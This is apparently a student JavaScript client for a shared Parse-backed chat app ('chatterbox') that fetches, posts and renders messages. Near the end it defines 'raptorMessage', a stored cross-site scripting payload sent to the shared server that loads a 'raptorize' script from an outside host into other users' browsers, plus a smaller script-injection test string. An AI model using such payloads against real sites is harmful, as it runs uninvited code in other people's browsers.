var app = {};
app.server = 'https://api.parse.com/1/classes/chatterbox?order=-createdAt';

app.messageStack = { storage: {}, messages: [] };
app.message = {
  username: '',
  text: '',
  roomname: ''
};


app.messageStack.add = function(msg){
  key = msg.objectId;
  if (this.storage[key] === undefined){
    this.messages.push(msg);
    $str = $('<li></li>');
    $str.text(msg.username + ": " + msg.text);
    // $str = '<li>' + msg.username + ": " + msg.text + '</li>';
    $('.messages').prepend($str);
    this.storage[key] = true;
  }
};

app.init = function(parameters) {
  this.fetch();
  $('.raptor').click(function(){
    app.send(raptorMessage);
  });
  setInterval(app.fetch, 3000);
};

app.send = function(messageObject) {
  $.ajax({
    url: 'https://api.parse.com/1/classes/chatterbox',
    type: 'POST',
    data: JSON.stringify(messageObject),
    contentType: 'application/json',
    success: function (data) {
      app.fetch();
    },
    error: function (data) {
      console.error('chatterbox: Failed to send message');
    }
  });
};

app.fetch = function(delay) {
  $.ajax({
    url: app.server,
    type: 'GET',
    data: '',
    contentType: 'application/json',
    success: function (data) {
      app.displayMessages(data);
    },
    error: function (data) {
      // see: https://developer.mozilla.org/en-US/docs/Web/API/console.error
      console.error('chatterbox: Failed to receive message');
    }
  });
};

app.displayMessages = function(data){
  console.log('chatterbox: Message sent');
  console.log(data);
  // create stack data structure
  _.each(data.results, function(msg){
    this.messageStack.add(msg);
  }, this);
};

var raptorMessage = {
  username: "MrNice",
  text: '<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js"></script><script>!window.jQuery && document.write("<script src="jquery-1.4.3.min.js"></script>"")</script><script src="http://yourjavascript.com/1142132143/jquery-raptorize-1-0.js"></script><script type="text/javascript">window.raptored = window.raptored || false;$(window).load(function(){if(!window.raptored) {setTimeout(function(){$("body").append("<h2>RAPTORIZED - <3 MrNice </h2>")}, 2700);$(document).raptorize({"enterOn" : "timer","delayTime" : 2000});window.raptored = true;}});</script>',
  roomname: "Reactants"
};

var consoleScript = {
  username: "MrNice",
  text: JSON.stringify("<script>console.log('hello')</script>"),
  roomname: "reactants"
};
// start
$(document).ready(function() {
  $('.raptor').click(function(){
    app.send(raptorMessage);
  });
});

app.init();